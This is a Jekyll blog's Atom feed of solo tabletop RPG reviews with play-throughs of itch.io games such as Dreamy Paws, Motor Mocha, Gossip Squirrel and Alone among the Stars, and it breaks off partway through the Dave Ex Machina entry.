<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-01-27T17:04:02+01:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Cloud Castle Chaos</title><subtitle>a bit of this. a bit of that.</subtitle><author><name>P2</name></author><entry><title type="html">Nine Reasons To…</title><link href="http://localhost:4000/rpg/2023/11/30/Nine-Reasons.html" rel="alternate" type="text/html" title="Nine Reasons To…" /><published>2023-11-30T00:00:00+01:00</published><updated>2023-11-30T00:00:00+01:00</updated><id>http://localhost:4000/rpg/2023/11/30/Nine-Reasons</id><content type="html" xml:base="http://localhost:4000/rpg/2023/11/30/Nine-Reasons.html"><![CDATA[<p><img src="https://cdn.pixabay.com/photo/2021/10/27/19/02/nine-of-swords-6748175_1280.jpg" alt="center-aligned-image" class="align-center" width="200px" height="400px" /></p>

<p class="notice--info">Game by <strong>Calliing</strong> @ <a href="https://calliing.itch.io/nine-reasons-to">https://calliing.itch.io/nine-reasons-to</a></p>

<blockquote>
  <p>For those of us who wake up weeping in the middle of the night beneath our wall of swords.</p>
</blockquote>

<p>I am not sure this will make me feel better and not worse… but can’t say for sure if I didn’t try! <br />
This will be a deeply personal game, so feel free to pretend I didn’t write about any awkward topic.</p>

<!--more-->

<h1 id="gameplay">Gameplay</h1>

<h3 id="timing">Timing</h3>
<p>15 minutes, depending how quick you can go though the lists.</p>

<h3 id="tools">Tools</h3>
<p>You might want to have a notepad if you want to keep track of your lists, but thinking about them is enough.</p>

<h3 id="setup">Setup</h3>
<p>No setup needed, start listing right away!</p>

<h3 id="lets-roll">Let’s roll</h3>

<p>Ok, I have to say I had my playthrough written out, but I decided to remove it. On one side, it really got too personal. On the other side, it would spoil the entire game. But I can still say how it works: on the first part, you are asked to write shorter and shorter lists of things that tend to be negative, either about yourself or about the world. Then you take a deep breath or two, check in with yourself, and move to the second part in which you write longer and longer lists of things that are positive.</p>

<h1 id="review">Review</h1>
<p>Is this game supposed to make me feel better? Because it did not. Maybe it’s the goal, to just reflect on what is going on and how one perceives things.</p>

<p>At mid game, I was feeling totally sad and inadequate. At the end of the game… who am I gonna fool, I didn’t get to the end of the game: I run out of positive things to write down. At some point the positive got so ridiculously irrelevant that it felt like cheating just to try and get at the end of the list.
Is it a known cognitive bias the fact that we recall the negative better than the positive? Yes, it is. Do I want to spend my evening playing a game that triggers exactly that bias and then leaves me hanging and feeling like crap? Nope, definitely not. Too bad.</p>]]></content><author><name>P2</name></author><category term="RPG" /><summary type="html"><![CDATA[Game by Calliing @ https://calliing.itch.io/nine-reasons-to For those of us who wake up weeping in the middle of the night beneath our wall of swords. I am not sure this will make me feel better and not worse… but can’t say for sure if I didn’t try! This will be a deeply personal game, so feel free to pretend I didn’t write about any awkward topic.]]></summary></entry><entry><title type="html">Dreamy Paws</title><link href="http://localhost:4000/rpg/2023/11/15/Dreamy-Paws.html" rel="alternate" type="text/html" title="Dreamy Paws" /><published>2023-11-15T00:00:00+01:00</published><updated>2023-11-15T00:00:00+01:00</updated><id>http://localhost:4000/rpg/2023/11/15/Dreamy-Paws</id><content type="html" xml:base="http://localhost:4000/rpg/2023/11/15/Dreamy-Paws.html"><![CDATA[<p><img src="https://img.itch.zone/aW1hZ2UvODgyODEwLzQ5NzE5NzUucG5n/794x1000/YDJJ6O.png" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">Game by <strong>Sunfish Co</strong> @ <a href="https://sunfishco.itch.io/dreamy-paws">https://sunfishco.itch.io/dreamy-paws</a></p>

<blockquote>
  <p>You are the owner of an intergalactic sanctuary, a haven for all lost and wayward creatures. All you want is for each creature to receive the love and attention it requires. Advertising the creatures you rescue on Spacebook is the best way to find their forever homes, and your creative descriptions draw many prospective patrons into the sanctuary. If you can dream it, you can find and rescue it :)</p>
</blockquote>

<p>This already feels a bit like Zoo Tycoon, will be expanding my sanctuary as soon as I can!</p>

<!--more-->

<h1 id="gameplay">Gameplay</h1>

<h3 id="timing">Timing</h3>
<p>20 minutes for reaching a couple of expansions… or as long as you are having fun.</p>

<h3 id="tools">Tools</h3>
<ul>
  <li>1 d6</li>
  <li>a standard deck of playing cards</li>
</ul>

<p>That’s it. You might want to add a notepad if you want to keep track of your adventures.</p>

<h3 id="setup">Setup</h3>
<p>Technically no setup needed, your first critters are collected when you start the game.
I will start with a small sanctuary with only 4 spots, and grow from there.</p>

<h3 id="lets-roll">Let’s roll</h3>

<ul>
  <li>Day 1: trying to rescue 4 animals</li>
</ul>

<p><strong>5 of clubs ; 6 of hearts ; 2</strong>: While she intimidates a lof of people, our winged sphinx cub is actually really cuddly and already super smart. We found her in a graveyard, smelling the fresh flowers: Sonya will fit well in a family with a big garden and a lot of patience for riddles.</p>

<p><strong>1 of spades ; J of clubs ; 4</strong>: Found in a ditch in the Bayou after the flood receded, this young spiked dolphin immediately showed his fiery temper doing his best to bite the team we sent to rescue him. His dorsal spikes might not be developed yet, but his teeth certainly are! If you have a large pond and are looking to get rid of whatever else lives in it, Doug will be happy to help you out!</p>

<p><strong>8 of spades ; 9 of diamonds ; 3</strong>: Kyle the koi was found during the yearly cleanup of the city river. Despite his bright color, he proved a master in hiding: too shy to approach us, we had to trap him with a net. But no worries, Kyle is doing good! He is a collector’s animal: he wil be perfect in a large fountain with some weeds and flowers in which to hide, and will be a beautiful surprise when he decides to show himself.</p>

<p><strong>2 of diamonds ; K of clubs ; 6</strong>: Ever wished to teach a parrot to talk? It will not happen with Louis, but you will still hear him: you better keep him entertained, or he will scream until he gets your attention. You might have hear of him already: there are videos all over the web of him stealing earrings directly from the ears of the passerbys in the city park. You won’t get bored with Louis, but it’s better if your neighbors don’t wear jewlery… and are hard of hearing.</p>

<ul>
  <li>Day 2: opening the sanctuary, we get 1 visit [rolled <strong>1</strong>]</li>
</ul>

<p><strong>Clubs</strong>: the gentleman was interested in Kyle, but ended up not adopting him.</p>

<ul>
  <li>Day 3: opening the sanctuary, we get 3 visits [rolled <strong>4</strong>]</li>
</ul>

<p><strong>Hearts</strong>: a young lady with a bright pink mohawk loved Louis showing her his crest, and they went home together <br />
<strong>Diamonds</strong>: a distinguished lady said she was too old for a dog, so she got Kyle for her natural pool <br />
<strong>Diamonds</strong>: a couple in their forties got home with Doug after the men told the woman his color matched her pearl necklace <br />
Total savings: 750$</p>

<ul>
  <li>Day 4: the sanctuary is almost empty, we look for new animals in need</li>
</ul>

<p><strong>4 of hearts ; 10 of spades ; 3</strong>: Wouldn’t you know what can be found in the most unexpected places, here are Todd, Tammy and Tilly the shrimp family. We had to save them from the roof of the clocktower, which is being renovated… and clearly in need of that because the three were found in a puddle of rainwater collecting in the bell room. How they ended up there? Most probably escaping from a sea bird that wanted them as dinner. They don’t like humans much, we are way too big for them, but they will make a great addiction to your aquarium, and help keep it clean.</p>

<p><strong>7 of spades ; 2 of hearts ; 5</strong>: One of the easiest rescues lately, Alina is a seagull that was found with an injured wing on the shipwreck at the harbor. Looks like she won’t be flying anymore, but if enticed with a french fry she will follow you to hell and back anyway! She is a bit big to carry on the shoulder if you wanted to feel like a pirate, but would appreciate living along the beach where she can easily scuttle to the water.</p>

<p><strong>5 of hearts ; 6 of diamonds ; 4</strong>: We don’t like breeders, especially when they want to resell their animals for backalley fights. That’s why we jumped to action when told that an individual was trying to sell a cub of walrus at the Boat&amp;Float tavern down the port. He didn’t like the idea of giving it to us as he had already started training him, but in the end we found an agreement. Chubby will grow to be BIG and we suspect after what he has been through he will never be friendly: you will need to provide a large pool for him, but he will be a great alternative to a guard dog.</p>

<ul>
  <li>Day 5: opening the sanctuary, we get 1 visit [rolled <strong>4</strong>]</li>
</ul>

<p><strong>Clubs</strong>: the man was really interested in Chubby, but changed his mind after being told how much he will grow</p>

<ul>
  <li>Day 6: opening the sanctuary, we get 3 visits [rolled <strong>6</strong>]</li>
</ul>

<p><strong>Clubs</strong>: Chubby is the star, but nobody dared to approach him <br />
<strong>Clubs</strong>: after not being able to answer a riddle, Sonya growled at the family that was visiting her <br />
<strong>Clubs</strong>: Alina showed interest in a teenage boy with big glasses, but turns out he just had half a sandwich in his pocket \</p>

<ul>
  <li>Day 7: opening the sanctuary, we get 1 visit [rolled <strong>4</strong>]</li>
</ul>

<p><strong>Spades</strong>: the man introduced himself as a crustacean lover, but the shrimp trio stayed hidden so he could not check them out</p>

<ul>
  <li>Day 8: opening the sanctuary, we get 1 visit [rolled <strong>1</strong>]</li>
</ul>

<p><strong>Clubs</strong>: a middle-eastern looking woman wanted to check out Sonya saying the she reminded her for home, but had not realized Sonya has wings</p>

<ul>
  <li>Day 9: opening the sanctuary, we get 3 visits [rolled <strong>3</strong>]</li>
</ul>

<p><strong>Clubs</strong>: a man with a dobermann came in asking to see Chubby, but we didn’t let him because of the dog <br />
<strong>Diamonds</strong>: a mom brought in a 8yo boy who fell in love with Alina and already promised her they will eat fish and chips every week <br />
<strong>Spades</strong>: Todd, Tammy and Tilly were in the mood to be seen today, but the lady realized they are too big and would eat the fish she already has <br />
Total savings: 1000$
→ We can build a new room in the sanctuary! Now we can host 5 critters.</p>

<h1 id="review">Review</h1>
<p>I am loving this, with just one problem: the colored version of the manual is so hard to read! White on salmon pink doesn’t seem ideal, I suggest to go with the black and white option.</p>

<p>The game provides enough guidance to help you getting creative but without hindering the process, and there are so many options available thanks to the deck of cards. The incentive of putting the animals up for adoption so that you can expand the sanctuary after reaching a certain goal gives that little additional spice to the game, and does wonders in pacing it so that it’s not completely repetitive. I’d have enjoyed a mechanic for factoring in the upkeep of the animals: maybe start with a set amount of money, and every day it will cost a tot per animal to open the sanctuary. A little added challenge that also means there is a way to lose the game… as I probably would have given all the days in which I wasn’t able to have anybody adopted.</p>

<p>Maybe it’s only because I played Motor Mocha right before this game, but I found myself coming up with descriptions also for the people that adopted the critters. Not required by the game, but hey why not adding a bit of fun and imagining where all those unusual animals will end up living!</p>]]></content><author><name>P2</name></author><category term="RPG" /><summary type="html"><![CDATA[Game by Sunfish Co @ https://sunfishco.itch.io/dreamy-paws You are the owner of an intergalactic sanctuary, a haven for all lost and wayward creatures. All you want is for each creature to receive the love and attention it requires. Advertising the creatures you rescue on Spacebook is the best way to find their forever homes, and your creative descriptions draw many prospective patrons into the sanctuary. If you can dream it, you can find and rescue it :) This already feels a bit like Zoo Tycoon, will be expanding my sanctuary as soon as I can!]]></summary></entry><entry><title type="html">Motor Mocha</title><link href="http://localhost:4000/rpg/2023/11/14/Motor-Mocha.html" rel="alternate" type="text/html" title="Motor Mocha" /><published>2023-11-14T00:00:00+01:00</published><updated>2023-11-14T00:00:00+01:00</updated><id>http://localhost:4000/rpg/2023/11/14/Motor-Mocha</id><content type="html" xml:base="http://localhost:4000/rpg/2023/11/14/Motor-Mocha.html"><![CDATA[<p><img src="https://img.itch.zone/aW1hZ2UvNjQzMTY3LzM0NDI1NTYucG5n/794x1000/Voowhb.png" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">Game by <strong>fencedforest</strong> @ <a href="https://fencedforest.itch.io/motor-mocha">https://fencedforest.itch.io/motor-mocha</a></p>

<blockquote>
  <p>This is a contemplative solo RPG in which you play as the last remaining barista on staff at a once-busy drive-through coffee shop during the COVID-19 pandemic of 2020.</p>
</blockquote>

<p>Not sure I would have wanted to play it while in lockdown… but as of now, I am all for brewing a cup of coffee and giving it a try.</p>

<!--more-->

<h1 id="gameplay">Gameplay</h1>

<h3 id="timing">Timing</h3>
<p>The author suggests to play over multiple days, to simulate working days. <br />
I don’t have that kind of time, so… between 5 and 40 minutes, depending on how (un)lucky you roll.</p>

<h3 id="tools">Tools</h3>
<ul>
  <li>1 d6</li>
  <li>1 d20</li>
  <li>a deck of tarot cards</li>
</ul>

<p>That’s it. You might want to add a notepad if you want to keep track of your adventures.</p>

<h3 id="setup">Setup</h3>
<p>To set the mood and the pace of the game, having a coffeeshop playlist is suggested. It does not play any part in the mechanics, so that can be skipped. <br />
Also, you should have a list of 20 names corresponding to the usual customers. I will make that up when I flip the relevant cards.</p>

<h3 id="lets-roll">Let’s roll</h3>

<p>Day 1: 3 cards, business as usual <br />
<strong>Queen of cups ; 2</strong>: a lady looking quite worried and a bit constipated. She orders a black tea, hope she wasn’t sick. <br />
<strong>3 of cups ; 20</strong>: a car of teenagers, frappuccinos for everybody. They were listening to some good punk-rock, I liked that! <br />
<strong>The Tower ; 4</strong>: no more customers for today, but the owner is sick and will infect us if he visits in the next 4 days.</p>

<p>Day 2: 15 cards + 3 because of nice weather <br />
<strong>Knight of wands ; 4</strong>: just an espresso for this man, he kept saying that he was in a hurry! <br />
<strong>8 of swords ; 8</strong>: this man smelled so strong of gasoline and yet was smoking a cigarette… while pulling his americano I could only hope he wasn’t going to catch fire <br />
<strong>The Moon</strong>: it’s nice to see Danny, his eyes smile even with the mask on <br />
<strong>6 of coins ; 11</strong>: this one got a cream coffee to celebrate she got vaccinated. Pleasently surprising, given the car full of religious stickers. <br />
<strong>Knight of cups ; 9</strong>: serving lattes to a customer and his mistress while he is on the phone talking about his divorce… fun stuff <br />
<strong>Page of coins ; 5</strong>: “Four coffees to go and make it quick, I am late for the meeting” that sounds a lot like not my problem <br />
<strong>10 of wands ; 3</strong>: such a well dressed lady, I hope she doesn’t spill the tea on her dress! <br />
<strong>The Sun</strong>: Nadine comes in with her newborn <br />
<strong>The Magician</strong>: I can never figure out what Jonah’s car smells of. Maybe cinnamon? <br />
<strong>7 of wands ; 1</strong>: this hippie guy was coughing non-stop, blaming it on smoking too much. I gave him his iced coffee, and hoped it was really the smoking. <br />
→ I will be working another 5 days before the symptoms arise.</p>

<h1 id="review">Review</h1>
<p>I didn’t go through all of this. I love the idea and the approach feels right, but this felt like playing “Guess Who” against nobody… more than making me dread the virus, it made me dread being a barista. The game has potential, but like this it is unripe and needs to be refined with something that makes playing it relevant.</p>

<p>The idea of using tarots is really nice, but the game lacks mechanics to make the most out of it. The core of the experience is “describe this new customer”: there is no incentive to come up with a conversation with them, no “make a drink and maybe get a bonus” mechanic, no “you got the virus here is a malus”, no nothing apart trying to answer the questions “how does the customer look” and maybe “what did the customer order”. Too bad.</p>]]></content><author><name>P2</name></author><category term="RPG" /><summary type="html"><![CDATA[Game by fencedforest @ https://fencedforest.itch.io/motor-mocha This is a contemplative solo RPG in which you play as the last remaining barista on staff at a once-busy drive-through coffee shop during the COVID-19 pandemic of 2020. Not sure I would have wanted to play it while in lockdown… but as of now, I am all for brewing a cup of coffee and giving it a try.]]></summary></entry><entry><title type="html">Gossip Squirrel</title><link href="http://localhost:4000/rpg/2023/11/13/Gossip-Squirrel.html" rel="alternate" type="text/html" title="Gossip Squirrel" /><published>2023-11-13T00:00:00+01:00</published><updated>2023-11-13T00:00:00+01:00</updated><id>http://localhost:4000/rpg/2023/11/13/Gossip-Squirrel</id><content type="html" xml:base="http://localhost:4000/rpg/2023/11/13/Gossip-Squirrel.html"><![CDATA[<p><img src="https://img.itch.zone/aW1hZ2UvNTkzMDUxLzMxMzY5NjAuanBn/794x1000/gm5oMf.jpg" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">Game by <strong>Lucian Kahn</strong> @ <a href="https://necromancy.itch.io/gossip-squirrel">https://necromancy.itch.io/gossip-squirrel</a></p>

<blockquote>
  <p>You are a Gossip Squirrel! That’s a real live talking squirrel who loves to gossip!</p>

  <p>In this game, you will walk (or wheel) around your neighborhood alone, talking to animals, plants, and inanimate objects and telling other animals, plants, and inanimate objects what they said.</p>
</blockquote>

<p>This sounds ridiculous, I like it! Let’s give it a try.</p>

<!--more-->

<h1 id="gameplay">Gameplay</h1>

<h3 id="timing">Timing</h3>
<p>You can go on as long as you are having fun!</p>

<h3 id="tools">Tools</h3>
<p>Nothing, but as usual you might want to have a notepad if you want to keep track of your adventures.</p>

<h3 id="setup">Setup</h3>
<p>The game suggests to go outside and play during an actual walk, but I am lazy so I did it from my couch, just picturing the road.</p>

<ul>
  <li>What kind of squirrel are you? <em>I am a curious and honest squirrel, but sometimes I can get anxious.</em></li>
  <li>Where are you going on your walk? <em>I will go from my home to the flower garden down the block.</em></li>
</ul>

<h3 id="lets-roll">Let’s roll</h3>

<p>Leaving the house, I greet the <strong>mailbox</strong>. He tells me it is sad because it has been forever since he received a postcard. I ask if at least it receives a lot of packages, maybe? Nah not even that, the packages do not fit!</p>

<p>Just down the road I see a <strong>cat</strong>. I keep my distance, one never knows. I ask if he knows whether it’s true that packages do not fit in the mailbox. Size is a relative concept, he starts saying, maybe the package is big maybe the mailbox is small, or maybe we are all too small?! I better leave before I get an existential crysis.</p>

<p>At the corner the <strong>bike</strong> with a stolen wheel is happy to see me. She doesn’t think the cat is too small, and she knows what she is talking about because he is quite heavy when he naps in her basket. But she takes that as a training, she knows her owner will be back soon with a new tire for her. I’ts going to be a new life, she hopes to get her basket converted in a flower pot. I better move or I will end up telling her that bikes turned into flower pots tend to not do much biking anymore.</p>

<p>I almost bump into the <strong>trash can</strong>. He looks sad, I ask he if would like to be turned into a flower pot too. He answers that at least he would be visited by butterflies and bees, rather than the usual stinky rats. I do not like rats, but the trash can says I look a lot like one, so I shouldn’t be so judgmental.</p>

<p>That hurt my feelings, so I try to get consolation at the <strong>ticket machine</strong> at the bus stop. In insight, that was not a wise choice: the machine tells me that he has a cousin that has never seen a squirrel, but instead is constantly in contact with bats. He also mumbles something about flying squirrels, but maybe he was still talking about bats. I better cross the road before I get an anxiety attack thinking about rats and bats.</p>

<p>The <strong>traffic light</strong> is friendly: I do not look like a bat at all, she says, my fur is so much shinier and my tail so much fluffier! That makes me feel better, just in time to get a snack now that I am at the park.</p>

<h1 id="review">Review</h1>
<p>This felt really weird at first. What am I even supposed to tell to a mailbox?? Luckily a list of topics is provided, so after a slow start the conversations kept flowing. No pressure of creating an incredible story, no goal or time ticking, I was surprised by how the game got into a flow and made me enjoy and relax the little silly interactions.</p>

<p>This might not be the game that sparks your creativity or makes you the hero of some high fantasy story, but it is perfect for forgetting stress for a few moment and reconnecting with the reality that surrounds us, in a kind and loving way.</p>]]></content><author><name>P2</name></author><category term="RPG" /><summary type="html"><![CDATA[Game by Lucian Kahn @ https://necromancy.itch.io/gossip-squirrel You are a Gossip Squirrel! That’s a real live talking squirrel who loves to gossip! In this game, you will walk (or wheel) around your neighborhood alone, talking to animals, plants, and inanimate objects and telling other animals, plants, and inanimate objects what they said. This sounds ridiculous, I like it! Let’s give it a try.]]></summary></entry><entry><title type="html">Alone among the Stars</title><link href="http://localhost:4000/rpg/2023/11/12/Alone-Among-Stars.html" rel="alternate" type="text/html" title="Alone among the Stars" /><published>2023-11-12T00:00:00+01:00</published><updated>2023-11-12T00:00:00+01:00</updated><id>http://localhost:4000/rpg/2023/11/12/Alone-Among-Stars</id><content type="html" xml:base="http://localhost:4000/rpg/2023/11/12/Alone-Among-Stars.html"><![CDATA[<p><img src="https://img.itch.zone/aW1hZ2UvMzQzMDc2LzE5MzE0OTEucG5n/794x1000/YsRyA6.png" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">Game by <strong>Takuma Okada</strong> @ <a href="https://noroadhome.itch.io/alone-among-the-stars">https://noroadhome.itch.io/alone-among-the-stars</a></p>

<blockquote>
  <p>A solo roleplaying game about exploring fantastic planets</p>

  <p>You are a solitary adventurer, hopping from planet to planet exploring. Each world has unique features for you to discover and record. 
In your ship’s log you record a short description and your reaction to each discovery.</p>

  <p>Play until you are tired, and want to return home. If you want to remember your travels, save the journal. If the memories bring you pain, burn it.</p>
</blockquote>

<p>A low stakes game, set in the big universe out there. Time to relax and explore some far away planets.</p>

<!--more-->

<h1 id="gameplay">Gameplay</h1>

<h3 id="timing">Timing</h3>
<p>You can go on as long as you are having fun!</p>

<h3 id="tools">Tools</h3>
<ul>
  <li>1 d6</li>
  <li>1 standard deck of 52 cards (no jokers)</li>
</ul>

<p>That’s it. You might want to add a notepad if you want to keep track of your adventures.</p>

<h3 id="setup">Setup</h3>
<p>No setup needed. Mix your deck of cards and get ready.</p>

<h3 id="lets-roll">Let’s roll</h3>

<p>Planet 1: <strong>Terra</strong> <br />
<strong>1</strong> card</p>

<ul>
  <li>Day 1 - <strong>Knight of Hearts ; 6</strong> <br />
I am well rested so I look out of the window during the launch. I can see the pyramids in the Egyptian desert… makes me think how impressive humanity is.</li>
</ul>

<p>Planet 2: <strong>Greenhouse</strong> <br />
<strong>3</strong> cards</p>

<ul>
  <li>
    <p>Day 4 - <strong>9 of Clubs ; 4</strong> <br />
We were not expecting on this barren planet to enter a cave and discover such luxurious vegetation. It’s warmer and more humid than outside so in insight it makes sense that they grow here.</p>
  </li>
  <li>
    <p>Day 5 - <strong>King of Spades ; 6</strong> <br />
Now we understand how photosynthesis works: we laid down to rest, but when we turned off our lamps we could still see! The evaporation of the vegetation forms luminescent clouds. Quite impressive to witness!</p>
  </li>
  <li>
    <p>Day 6 - <strong>Knight of Diamonds ; 2</strong> <br />
Back on the surface and preparing to leave the planet, we could finally see the local sunset. As soon as the light was gone, the desert itself started beaming of so many beautiful colors. Must be some microbioma, seems that fluorescence and luminescence are popular on this planet! Sadly, we do not have the equipment to analyze it.</p>
  </li>
</ul>

<p>Planet 3: <strong>Amazonas</strong> <br />
<strong>4</strong> cards</p>

<ul>
  <li>
    <p>Day 10 - <strong>5 of Diamonds ; 1</strong> <br />
We named the planet based on the intricate and flourishing vegetation, we couldn’t even land properly. Luckily the treetops seem to hold us, and our position allowed the population of little monkeys of a bright blue color to look at us with as much interest as we look at them.</p>
  </li>
  <li>
    <p>Day 11 - <strong>Ace of Spades ; 1</strong> <br />
The monkeys disappeared all of a sudden, so we followed them. They all went to an opening in the trees and waited. We felt the rumbling first, then an enormous geyser erupted, an immense pillar of bright blue water. We stepped back but the monkeys showered in it: this might be where they get their color from.</p>
  </li>
  <li>
    <p>Day 12 - <strong>Queen of Clubs ; 1</strong> <br />
We sent a drone to investigate the geyser, and it did not come back. The last image is the placid surface opening like a mouth and sucking in the drone in a whirl that looked a lot like a tentacle. That is quite worriesome.</p>
  </li>
  <li>
    <p>Day 13 - <strong>6 of Spades ; 4</strong> <br />
How many more surprises on this planet? Too bad it’s time to fly home, but there seems to be a lot of phenomena worth investigating. For example, this morning we woke up and it had snowed. Actual fluffy freezing snow.</p>
  </li>
</ul>

<h1 id="review">Review</h1>
<p>This was such a relaxing experience. No existential dread, just a lot of curiosity about what could possibly be waiting to get discovered on the next day, let alone the next planet. Of course, one could play with carnivorous rocks and corrosive clouds if that is what he likes… but there is no pressure in solving a situation for the best or the worse, you could just be looking out of your spaceship window and scribbling about the panorama. Or not, and you would dress up and go exploring.</p>

<p>There are no reference tables apart from the card prompts: if it’s a day when you lack inspiration, the game could get monotonous quite quickly. Exactly for this situation I like to use an illustrated deck: if nothing comes to my mind based on the prompt, I can look at the card and see if the drawings bring any idea.</p>]]></content><author><name>P2</name></author><category term="RPG" /><summary type="html"><![CDATA[Game by Takuma Okada @ https://noroadhome.itch.io/alone-among-the-stars A solo roleplaying game about exploring fantastic planets You are a solitary adventurer, hopping from planet to planet exploring. Each world has unique features for you to discover and record. In your ship’s log you record a short description and your reaction to each discovery. Play until you are tired, and want to return home. If you want to remember your travels, save the journal. If the memories bring you pain, burn it. A low stakes game, set in the big universe out there. Time to relax and explore some far away planets.]]></summary></entry><entry><title type="html">Honey I shrunk the grad students!</title><link href="http://localhost:4000/rpg/2023/11/11/Honey-Grad-Students.html" rel="alternate" type="text/html" title="Honey I shrunk the grad students!" /><published>2023-11-11T00:00:00+01:00</published><updated>2023-11-11T00:00:00+01:00</updated><id>http://localhost:4000/rpg/2023/11/11/Honey-Grad-Students</id><content type="html" xml:base="http://localhost:4000/rpg/2023/11/11/Honey-Grad-Students.html"><![CDATA[<p><img src="https://img.itch.zone/aW1hZ2UvNzQyNzA2LzQxMzg1MTQucG5n/original/WK1848.png" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">Game by <strong>Marc Strocks</strong> @ <a href="https://mstrocks.itch.io/honey-i-shrunk-the-grad-students">https://mstrocks.itch.io/honey-i-shrunk-the-grad-students</a></p>

<blockquote>
  <p>Survive the far-reaches of the laboratory!</p>

  <p>You head to the research lab, just like every day – and suddenly the prototype atomizer activates!
You and other grad students are accidentally shrunk to minuscule size… 
Can you survive spiders, fruit-flies and A/C wind gusts?! The lab where you work just got a LOT more dangerous!</p>
</blockquote>

<p>Way to experience the chemistry lab from a new point of view!</p>

<!--more-->

<h1 id="gameplay">Gameplay</h1>

<h3 id="timing">Timing</h3>
<p>You can go on as long as you are having fun!</p>

<h3 id="tools">Tools</h3>
<ul>
  <li>2 d6</li>
</ul>

<p>That’s it. You might want to add a notepad if you want to keep track of your adventures.</p>

<h3 id="setup">Setup</h3>
<ul>
  <li>What is your major? <em>Ancient Greek history</em></li>
  <li>What is your fear? <em>Blood</em></li>
  <li>What are your skills? <em>Cooking and speed-reading</em></li>
  <li>What is your useful item? <em>A pocket lamp</em></li>
  <li>What is your memento? <em>A picture of my cat</em></li>
  <li>What is your concern? <em>Opening the sink to drink</em></li>
</ul>

<h3 id="lets-roll">Let’s roll</h3>

<p>Why am I even in a chemistry lab, as a history major?? <br />
<strong>10</strong> → I remember I was looking for dry ice to cool down some drinks, it’s hot this summer!</p>

<p>Not sure what happened, can I figure out where I am? <br />
<strong>12</strong> → I opened the cold-room door, put in a hand searching for the light switch and touched something strange. So I guess I am right outside the door of the fridge cellar. Being inside would have been worse!</p>

<p>Being small didn’t make my thirst any smaller! I need to find water now. <br />
<strong>6 ; 4</strong> → The only sink is high above the desks, way out of reach. Maybe the cold-room door has some condensation? <br />
<strong>9</strong> → Yes it does! I can drink it and get a bit refreshed. I will just ignore the odd taste.</p>

<p>Ok, focus on the sink. Can I climb the table to get to it? <br />
<strong>3-1 ; 2</strong> → Turns out that nope, the legs are really slippery and I found that out only after losing my grip and landing badly on my ankle.</p>

<p>Can I still walk? <br />
<strong>8</strong> → Barely but yes. Let’s walk around and see what we can find.</p>

<p>Maybe somebody left a coat on a chair and I can climb on it? <br />
<strong>6 ; 5</strong> → Yes, but I didn’t think that now I would be stuck on the chair. Not much better.</p>

<p>Can I at least get some rest sheltering in a pocket of the coat? <br />
<strong>9</strong> → Yes, and I even find some crumbs of a snack… I will eat this so I can feel better.</p>

<p>I see the upper drawer of the desk is open, can I jump until there? <br />
<strong>9</strong> → Yes, the chair was close enough that with a bit of courage I manage to jump over.</p>

<p>Is there any stationery to build a ladder to the desk? <br />
<strong>8</strong> → Yes, the ruler is long enough to be put up and used as a ramp.</p>

<p>Is there any danger on the desk? <br />
<strong>10</strong> → No danger in sight, the way is free to the sink!</p>

<p>Does the sink have an easy-to-use lever, or a knob? <br />
<strong>5 ; 1</strong> → Bad luck, it has a knob… and is this red sticky puddle blood?? Oh no, from the fear I walk back and fall into the sink.</p>

<p>Anything in the sink I can use to climb out? <br />
<strong>7 ; 3</strong> → Nothing at all, and the walls are really slippery.</p>

<p>It’s going to be a long wait until somebody comes and notices me… Do I at least have a little bit of water from the dripping tap? <br />
<strong>7 ; 1</strong> → No dripping from the sink, just more of the red substance that scared me before. The only thing I can do is sit in a corner and weep.</p>

<h1 id="review">Review</h1>
<p>Such a creative setting, so many possibilities to create chaos! Too bad I ended up using the table pretty much as a yes/no oracle, no much variation came up during my game. The mechanics are for storytelling more than for roleplaying, and they probably work better if you play with a few friends that got shrunk with you.</p>

<p>I missed a time tracker or health tracker, that would have put a bit more of urgency into the game. Also, as a simple improvement for solo games, I would swap out one of the entries of the “Complications” table with a random encounter: without a GM suggesting that, I was too focused on the actions to think about putting a scary cockroach in there!</p>]]></content><author><name>P2</name></author><category term="RPG" /><summary type="html"><![CDATA[Game by Marc Strocks @ https://mstrocks.itch.io/honey-i-shrunk-the-grad-students Survive the far-reaches of the laboratory! You head to the research lab, just like every day – and suddenly the prototype atomizer activates! You and other grad students are accidentally shrunk to minuscule size… Can you survive spiders, fruit-flies and A/C wind gusts?! The lab where you work just got a LOT more dangerous! Way to experience the chemistry lab from a new point of view!]]></summary></entry><entry><title type="html">Dave Ex Machina</title><link href="http://localhost:4000/rpg/2023/11/10/Dave-Ex-Machina.html" rel="alternate" type="text/html" title="Dave Ex Machina" /><published>2023-11-10T00:00:00+01:00</published><updated>2023-11-10T00:00:00+01:00</updated><id>http://localhost:4000/rpg/2023/11/10/Dave-Ex-Machina</id><content type="html" xml:base="http://localhost:4000/rpg/2023/11/10/Dave-Ex-Machina.html"><![CDATA[<p><img src="https://img.itch.zone/aW1hZ2UvNzIwMDUwLzM5OTE4NzkuanBn/original/UTlvdL.jpg" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">Game by <strong>Alfred Valley</strong> @ <a href="https://alfredvalley.itch.io/dave-ex-machina">https://alfredvalley.itch.io/dave-ex-machina</a></p>

<blockquote>
  <p>You are Dave.</p>

  <p>You are a somewhat average human person whose interests include eating pizza, watching TV and minding your own business. Life would be fine and dandy if it wasn’t for one small thing…</p>

  <p>Every so often someone somewhere in an alternative dimension performs a summoning ritual but, due to some arcane typo, instead of a demon they get you, Dave.</p>
</blockquote>

<p>Such a simple premise. Well, let’s see how it goes!</p>

<!--more-->

<h1 id="gameplay">Gameplay</h1>

<h3 id="timing">Timing</h3>
<p>15 minutes… but you can make it longer if you wish!</p>

<h3 id="tools">Tools</h3>
<ul>
  <li>3 d6</li>
</ul>

<p>That’s it. You might want to add a notepad if you want to keep track of your adventures.</p>

<h3 id="setup">Setup</h3>
<ul>
  <li>Who are you? <em>Well, I am Dave of course</em></li>
  <li>What are your knacks?
    <ul>
